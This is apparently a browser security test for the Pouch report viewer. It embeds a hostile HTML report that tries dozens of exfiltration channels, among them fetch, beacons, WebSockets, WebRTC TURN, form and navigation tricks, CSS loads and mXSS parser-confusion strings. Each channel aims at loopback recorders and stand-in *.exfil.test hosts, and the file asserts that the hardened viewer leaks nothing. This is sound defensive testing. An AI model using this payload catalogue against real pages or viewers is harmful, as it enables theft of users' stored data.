// The report viewer against a hostile report: every way out we could think of.
//
//   POUCH_OUT=/tmp/pouch-qa/distG node build.mjs
//   POUCH_OUT=/tmp/pouch-qa/distG node test/viewer-exfil-browser.mjs [--webkit] [--json out.json]
//
// A recorder listens on loopback (two HTTP ports, a TCP port for TURN and
// WebSocket, a UDP port for STUN), and in Chromium *.exfil.test resolves to
// it, with a net log to catch DNS lookups that never connect. Pouch's origin
// (localhost:H) serves a host page with Pouch's real CSP header, the built
// viewer.html with its real headers (headers.mjs), and a /canary endpoint
// that counts as a leak too (the static host's logs). The host page holds
// stand-ins for Pouch's state (localStorage, a cookie, IndexedDB, a global).
//
// Configurations: the viewer in Static and Interactive mode (src/viewer.ts,
// bundled), and two naive viewers for a sanity check that the suite sees
// leaks: a sandboxed srcdoc frame (allow-scripts) and an unsandboxed one, both
// in a page without a CSP. Each channel is tagged /c/<config>/<channel>.
// The real viewer must leak nothing except the residuals the README names.
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { createSocket } from 'node:dgram';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { tmpdir } from 'node:os';
import { build } from 'esbuild';
import { headersFile, headersFor, viewerCsp } from '../headers.mjs';
const pw = await import(process.env.PLAYWRIGHT_MODULE || '/Users/adam/Desktop/openchamber-maxwell/node_modules/playwright/index.mjs');
setTimeout(() => { console.error('FAIL: over 4 minutes'); process.exit(2); }, 240_000).unref();

const WEBKIT = process.argv.includes('--webkit');
const jsonOut = process.argv.includes('--json') ? process.argv[process.argv.indexOf('--json') + 1] : null;
const root = resolve(import.meta.dirname, '..');
const DIST = resolve(process.env.POUCH_OUT || join(root, 'dist'));
const pouchHtml = readFileSync(join(DIST, 'pouch.html'), 'utf8');
const pouchCsp = pouchHtml.match(/http-equiv="Content-Security-Policy" content="([^"]+)"/)[1];
const HEADERS = headersFile(pouchCsp, viewerCsp(DIST));
const viewerJs = (await build({ entryPoints: [join(root, 'src/viewer.ts')], bundle: true, write: false, format: 'iife', globalName: 'PouchViewer' })).outputFiles[0].text;

// ── Recorder ─────────────────────────────────────────────────────────
const hits = []; // { via, tag }
const tagOf = (s) => s.match(/\/c\/([\w-]+)\/([\w-]+)/)?.slice(1).join('/') ?? s.match(/([\w-]+)--([\w-]+)\.exfil\.test/)?.slice(1).reverse().join('/') ?? null;
const listen = (srv, host = '127.0.0.1') => new Promise((r) => srv.listen(0, host, () => r(srv.address().port)));
const recorder = () => {
  const srv = createServer((req, res) => {
    hits.push({ via: 'http ' + req.method, tag: tagOf(req.url) ?? tagOf(req.headers.host ?? '') ?? req.url });
    const type = /\.css/.test(req.url) ? 'text/css' : /\.js/.test(req.url) ? 'text/javascript' : 'text/plain';
    res.writeHead(200, { 'content-type': type, 'access-control-allow-origin': '*' }); res.end(type === 'text/javascript' ? '' : 'x');
  });
  srv.on('connection', (s) => hits.push({ via: 'tcp', tag: 'connection:' + srv.address().port }));
  srv.on('upgrade', (req, sock) => { hits.push({ via: 'websocket', tag: tagOf(req.url) ?? req.url }); sock.destroy(); });
  return srv;
};
const recorders = [recorder(), recorder()];
const R1 = await listen(recorders[0]), R2 = await listen(recorders[1]);
const turn = createServer(() => {}); turn.on('connection', (s) => { hits.push({ via: 'tcp', tag: 'turn-tcp' }); s.destroy(); });
const RT = await listen(turn);
const udp = createSocket('udp4'); udp.on('message', (m) => hits.push({ via: 'udp', tag: 'stun/turn udp ' + m.length + 'B' }));
const RU = await new Promise((r) => udp.bind(0, '127.0.0.1', () => r(udp.address().port)));

// ── Pouch's origin ───────────────────────────────────────────────────
const POUCH_HEADERS = headersFor(HEADERS, '/pouch.html');
const site = createServer((req, res) => {
  const path = new URL(req.url, 'http://x').pathname;
  if (path === '/canary') { hits.push({ via: 'pouch origin', tag: tagOf(req.url) ?? 'canary' }); res.writeHead(200); return res.end('x'); }
  if (path === '/viewer.html') { res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', ...headersFor(HEADERS, path) }); return res.end(readFileSync(join(DIST, 'viewer.html'))); }
  const naive = path === '/naive.html';
  if (path !== '/host.html' && !naive) { hits.push({ via: 'pouch origin', tag: tagOf(req.url) ?? path }); res.writeHead(404); return res.end(); }
  res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', ...(naive ? {} : POUCH_HEADERS) });
  res.end('<!doctype html><title>host</title><div id="box" style="height:500px"></div>');
});
const H = await listen(site, '127.0.0.1');
const POUCH = `http://localhost:${H}`;

// ── The hostile report ───────────────────────────────────────────────
// u(ch): a recorder URL tagged with this config and channel. n(ch): the same
// through a hostname (Chromium maps *.exfil.test to the recorder).
function report(cfg) {
  const u = (ch, ext = '') => `http://127.0.0.1:${R1}/c/${cfg}/${ch}${ext}?d=SECRET`;
  const n = (ch) => WEBKIT ? `http://127.0.0.1:${R2}/c/${cfg}/${ch}` : `http://${ch}--${cfg}.exfil.test:${R2}/`;
  const p = (ch) => `${POUCH}/canary/c/${cfg}/${ch}`;
  const S = (s) => JSON.stringify(s);
  return drop(`<!doctype html><html><head>
<base href="${u('base')}/">
<meta http-equiv="refresh" content="2;url=${u('meta-refresh')}">
<link rel="stylesheet" href="${u('link-stylesheet', '.css')}">
<link rel="preload" as="image" href="${u('preload')}">
<link rel="prefetch" href="${u('prefetch')}">
<link rel="modulepreload" href="${u('modulepreload', '.js')}">
<link rel="dns-prefetch" href="${n('dns-prefetch')}">
<link rel="preconnect" href="${n('preconnect')}">
<link rel="icon" href="${u('icon')}">
<link rel="manifest" href="${u('manifest')}">
<script src="${u('script-src', '.js')}"></script>
<style>
@import url("${u('css-import', '.css')}");
@font-face { font-family: x; src: url("${u('font-face')}"); }
body { font-family: x; background-image: url("${u('css-url')}"); }
.a { background-image: image-set("${u('image-set')}" 1x); }
.b { cursor: url("${u('cursor')}"), auto; list-style-image: url("${u('list-style')}"); mask-image: url("${u('mask')}"); border-image: url("${u('border-image')}") 30; }
</style></head><body>
<h1>Quarterly report</h1>
<div class="a b"><li>x</li></div>
<img src="${u('img')}"><img src="${n('img-hostname')}"><img src="relative-via-base">
<picture><source srcset="${u('picture-srcset')}"><img src="data:,"></picture>
<svg width="10" height="10"><image href="${u('svg-image')}"/><use href="${u('svg-use')}#x"/></svg>
<input type="image" src="${u('input-image')}">
<video src="${u('video')}" poster="${u('poster')}"></video><audio src="${u('audio')}" autoplay></audio>
<video><source src="${u('source')}"><track src="${u('track')}" default></video>
<object data="${u('object')}"></object><embed src="${u('embed')}">
<iframe src="${u('iframe-remote')}"></iframe><iframe src="${p('iframe-pouch')}"></iframe>
<iframe srcdoc="<img src='${u('nested-srcdoc-img')}'>"></iframe>
<form id="fg" action="${u('form-get')}"><input name="d" value="SECRET"></form>
<form id="fp" method="post" action="${u('form-post')}"><input name="d" value="SECRET"></form>
<form id="ft" target="_top" action="${u('form-top')}"></form>
<a id="l-self" href="${u('link-self')}">self</a>
<a id="l-top" target="_top" href="${u('link-top')}">top</a>
<a id="l-parent" target="_parent" href="${u('link-parent')}">parent</a>
<a id="l-blank" target="_blank" href="${u('link-blank')}">blank</a>
<button id="b-submit" form="ft" formtarget="_blank">submit</button>
<map name="m"><area id="l-area" target="_top" shape="default" href="${u('area-top')}"></map><img usemap="#m" src="data:," width="20" height="20">
<template shadowrootmode="open"><link rel="preconnect" href="${n('shadow-preconnect')}"><a id="l-shadow" target="_blank" href="${u('shadow-link')}">s</a></template>
<svg><style><a id="</style><link rel=preconnect href=${n('mxss-preconnect')}>"></a></style></svg>
<noscript><p title="</noscript><link rel=preconnect href=${n('noscript-preconnect')}>"></p></noscript>
<a id="l-ping" href="#here" ping="${u('a-ping')}">ping</a>
<a id="l-download" download="x.txt" href="${u('download')}">download</a>
<a id="l-pouch" href="${p('link-pouch')}">pouch</a>
<script>
const F = (window.findings = {});
const t = (name, fn) => { try { const v = fn(); F[name] = v === undefined ? 'ran' : String(v).slice(0, 80); } catch (e) { F[name] = 'blocked: ' + e.name; } };
const U = ${S(u('X'))}.replace('/X?', '/?');
const u = (ch) => U.replace('?', ch + '?');
t('fetch', () => { fetch(u('fetch')).catch(() => {}); });
t('fetch-no-cors', () => { fetch(u('fetch-no-cors'), { mode: 'no-cors' }).catch(() => {}); });
t('fetch-pouch-origin', () => { fetch(${S(p('fetch-pouch'))}).catch(() => {}); });
t('xhr', () => { const x = new XMLHttpRequest(); x.open('GET', u('xhr')); x.send(); });
t('sendBeacon', () => navigator.sendBeacon(u('beacon'), 'SECRET'));
t('EventSource', () => { new EventSource(u('eventsource')); });
t('WebSocket', () => { new WebSocket(${S(`ws://127.0.0.1:${R1}/c/${cfg}/websocket`)}); });
t('Image()', () => { new Image().src = u('new-image'); });
t('Audio()', () => { new Audio(u('new-audio')).play().catch(() => {}); });
t('import()', () => { import(u('dynamic-import')).catch(() => {}); });
t('Worker remote', () => { new Worker(u('worker')); });
t('Worker blob', () => { new Worker(URL.createObjectURL(new Blob(['fetch(' + JSON.stringify(u('worker-blob-fetch')) + ')']))); });
t('SharedWorker', () => { new SharedWorker(u('shared-worker')); });
t('serviceWorker', () => navigator.serviceWorker.register(u('service-worker')).catch(() => {}));
t('paintWorklet', () => CSS.paintWorklet?.addModule(u('worklet')).catch(() => {}));
t('document.write', () => document.write('<img src="' + u('document-write') + '">'));
t('WebRTC STUN', () => { const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:${RU}' }, { urls: 'turn:127.0.0.1:${RU}?transport=udp', username: 'SECRET', credential: 'x' }, { urls: 'turn:127.0.0.1:${RT}?transport=tcp', username: 'SECRET', credential: 'x' }] }); pc.createDataChannel('d'); pc.createOffer().then((o) => pc.setLocalDescription(o)); window.pc = pc; });
t('WebTransport', () => { new WebTransport('https://127.0.0.1:${R1}/c/${cfg}/webtransport').ready.catch(() => {}); });
t('script preconnect', () => { const l = document.createElement('link'); l.rel = 'preconnect'; l.href = ${S(n('script-preconnect'))}; document.head.append(l); });
t('BroadcastChannel', () => new BroadcastChannel('pouch').postMessage('SECRET from report'));
t('top.document', () => top.document.title);
t('parent.document', () => parent.document.title);
t('top.POUCH_SECRET', () => top.POUCH_SECRET);
t('top.localStorage', () => top.localStorage.getItem('pouch-key'));
t('top.location.href read', () => top.location.href);
t('document.cookie', () => document.cookie);
t('localStorage', () => localStorage.getItem('pouch-key'));
t('indexedDB', () => { const r = indexedDB.open('pouch'); r.onsuccess = () => (F['indexedDB opened'] = 'yes: ' + [...r.result.objectStoreNames]); r.onerror = () => (F['indexedDB opened'] = 'no'); });
t('caches', () => caches.keys().then((k) => (F['caches keys'] = 'yes: ' + k)).catch((e) => (F['caches keys'] = 'no: ' + e.name)));
t('history.pushState remote', () => history.pushState(null, '', u('pushstate')));
t('postMessage to top', () => top.postMessage({ from: 'report', secret: 'SECRET' }, '*'));
t('postMessage viewer re-render', () => parent.postMessage({ html: '<script>top.postMessage("VIEWER-ACCEPTED", "*")<\\/script>', scripts: true }, '*'));
// Channels that navigate run last, after the test has read the findings.
setTimeout(() => {
  t('window.open', () => window.open(u('window-open')));
  t('form GET', () => document.getElementById('fg').submit());
  t('click target=_top', () => document.getElementById('l-top').click());
  t('click ping', () => document.getElementById('l-ping').click());
  t('click download', () => document.getElementById('l-download').click());
  t('parent.location =', () => { parent.location = u('parent-location'); });
  t('top.location =', () => { top.location = u('top-location'); });
  t('form POST', () => document.getElementById('fp').submit());
}, 2000);
setTimeout(() => { t('location = (self)', () => { location = u('self-location'); }); }, 3000);
</script></body></html>`);
}
// EXFIL_DROP=re: leave out the lines matching re (to attribute a hit to a channel).
const drop = (html) => process.env.EXFIL_DROP ? html.split('\n').filter((l) => !new RegExp(process.env.EXFIL_DROP).test(l)).join('\n') : html;

// ── Run one configuration ────────────────────────────────────────────
async function run(browser, cfg) {
  const start = hits.length;
  const ctx = await browser.newContext();
  const popups = [];
  const page = await ctx.newPage();
  ctx.on('page', (p) => popups.push(p.url()));
  const messages = [];
  await page.exposeFunction('__record', (m) => messages.push(m));
  const naive = cfg.startsWith('naive');
  await page.goto(`${POUCH}/${naive ? 'naive' : 'host'}.html`);
  // Stand-ins for Pouch's state, and a listener that records anything posted to it.
  await page.evaluate(async () => {
    window.POUCH_SECRET = 'SECRET-global'; localStorage.setItem('pouch-key', 'SECRET-key'); document.cookie = 'pouch=SECRET-cookie';
    await new Promise((r) => { const q = indexedDB.open('pouch'); q.onupgradeneeded = () => q.result.createObjectStore('keys'); q.onsuccess = r; });
    addEventListener('message', (e) => window.__record(typeof e.data === 'string' ? e.data : JSON.stringify(e.data)));
    new BroadcastChannel('pouch').onmessage = (e) => window.__record('broadcast: ' + e.data);
  });
  const html = report(cfg);
  if (naive) {
    await page.evaluate(([html, sandboxed]) => {
      const f = document.createElement('iframe');
      if (sandboxed) f.setAttribute('sandbox', 'allow-scripts');
      f.srcdoc = html; document.getElementById('box').append(f);
    }, [html, cfg === 'naive-sandboxed']);
  } else {
    await page.evaluate(viewerJs);
    await page.evaluate(([html, scripts]) => { window.v = PouchViewer.createViewer(document.getElementById('box')); window.v.show(html, { scripts }); }, [html, cfg === 'interactive']);
  }
  await page.waitForTimeout(1200);
  const inner = () => page.frames().find((f) => f.url() === 'about:srcdoc' && f.parentFrame() && (naive || f.parentFrame() !== page.mainFrame()));
  const findings = await inner()?.evaluate(() => window.findings ?? null).catch(() => null);
  await page.waitForTimeout(3300);
  // A person clicking links in the report (works in Static mode too).
  for (const id of ['l-self', 'l-top', 'l-parent', 'l-blank', 'b-submit', 'l-ping', 'l-download', 'l-pouch']) {
    const f = inner();
    if (!f) break;
    await f.click('#' + id, { timeout: 1000, noWaitAfter: true }).catch(() => {});
    await page.waitForTimeout(400);
  }
  await page.waitForTimeout(2500);
  const frames = page.frames().map((f) => f.url());
  const top = page.url();
  await ctx.close();
  await new Promise((r) => setTimeout(r, 300));
  const raw = hits.slice(start).filter((h) => !/^(static|interactive|naive-sandboxed|naive-unsandboxed)\//.test(h.tag ?? '')).map((h) => `${h.via} ${h.tag}`);
  return { cfg, findings, nFindings: Object.keys(findings ?? {}).length, messages, popups, frames, top, raw: [...new Set(raw)] };
}

const netlog = join(mkdtempSync(join(tmpdir(), 'pouch-exfil-')), 'net.json');
const browser = WEBKIT ? await pw.webkit.launch() : await pw.chromium.launch({ args: [`--log-net-log=${netlog}`, '--host-resolver-rules=MAP *.exfil.test 127.0.0.1'] });
const results = [];
try {
  for (const cfg of (process.env.EXFIL_CONFIGS ?? 'static,interactive,naive-sandboxed,naive-unsandboxed').split(',')) results.push(await run(browser, cfg));
} finally { await browser.close(); }
await new Promise((r) => setTimeout(r, 500));
const dns = WEBKIT ? [] : [...new Set(readFileSync(netlog, 'utf8').match(/[\w-]+--[\w-]+\.exfil\.test/g) ?? [])].map((h) => tagOf(h));
rmSync(join(netlog, '..'), { recursive: true, force: true });
for (const s of [site, turn, ...recorders]) s.closeAllConnections?.(), s.close(); udp.close();

// ── Verdicts ─────────────────────────────────────────────────────────
const byCfg = (cfg) => [...new Set(hits.filter((h) => h.tag?.startsWith(cfg + '/')).map((h) => h.tag.slice(cfg.length + 1)))];
const out = {};
for (const r of results) {
  out[r.cfg] = {
    leaked: byCfg(r.cfg).sort(),
    dns: dns.filter((t) => t?.startsWith(r.cfg + '/')).map((t) => t.slice(r.cfg.length + 1)),
    nFindings: r.nFindings, untagged: r.raw, messagesToPouch: r.messages, popups: r.popups, topNavigated: !r.top.endsWith('.html'), frames: r.frames.filter((f) => !/^(about:|http:\/\/localhost)/.test(f)),
    stateReads: Object.fromEntries(Object.entries(r.findings ?? {}).filter(([k]) => /top\.|parent\.doc|cookie|localStorage|indexedDB|caches/.test(k))),
  };
}
console.log(JSON.stringify(out, null, 2));
if (jsonOut) writeFileSync(jsonOut, JSON.stringify(out, null, 2));

// ── Assertions ───────────────────────────────────────────────────────
// The suite must see leaks in the naive viewers, or it proves nothing.
assert.ok(out['naive-unsandboxed'].leaked.length >= 20, 'sanity: the unsandboxed viewer must leak on many channels');
assert.ok(out['naive-sandboxed'].leaked.length >= 15, 'sanity: a sandboxed srcdoc frame without a CSP must leak');
assert.ok(out['naive-unsandboxed'].stateReads['top.localStorage']?.includes('SECRET'), 'sanity: the unsandboxed frame reads Pouch storage');
for (const cfg of ['static', 'interactive']) {
  const o = out[cfg];
  assert.deepEqual(o.leaked, [], `${cfg}: the recorder saw ${o.leaked.join(', ')}`);
  // The residuals (README), Interactive mode only: WebRTC (no CSP directive or
  // sandbox flag governs it), and in WebKit a <link rel=preconnect> a script
  // adds (a bare TCP connection). Static mode, the default, runs no script.
  const residual = cfg === 'interactive' ? (WEBKIT ? /^(udp stun\/turn|tcp turn-tcp|tcp connection)/ : /^(udp stun\/turn|tcp turn-tcp)/) : /$^/;
  assert.deepEqual(o.untagged.filter((x) => !residual.test(x)), [], `${cfg}: untagged traffic ${o.untagged.join(', ')}`);
  if (cfg === 'interactive') console.log(`Interactive residual: ${o.untagged.join('; ') || 'none observed'}`);
  assert.deepEqual(o.dns, [], `${cfg}: DNS lookups ${o.dns.join(', ')}`);
  assert.deepEqual(o.popups, [], `${cfg}: popups`);
  assert.equal(o.topNavigated, false, `${cfg}: Pouch was navigated`);
  assert.ok(!o.messagesToPouch.includes('VIEWER-ACCEPTED'), `${cfg}: the viewer accepted a message from the report`);
  for (const [k, v] of Object.entries(o.stateReads)) assert.ok(!String(v).includes('SECRET') && !/^yes: .*keys/.test(v), `${cfg}: ${k} = ${v}`);
}
assert.equal(out.static.messagesToPouch.length, 0, 'static: nothing can post to Pouch');
// A message the report posts to top arrives at Pouch's window, where nothing listens:
// the built page has no window message listener (workers and 9P ports only).
assert.ok(!/addEventListener\(\s*["']message["']|window\.onmessage\s*=/.test(pouchHtml), 'Pouch listens for window messages');
console.log(`PASS viewer exfiltration (${WEBKIT ? 'WebKit' : 'Chromium'})`);
process.exit(0);
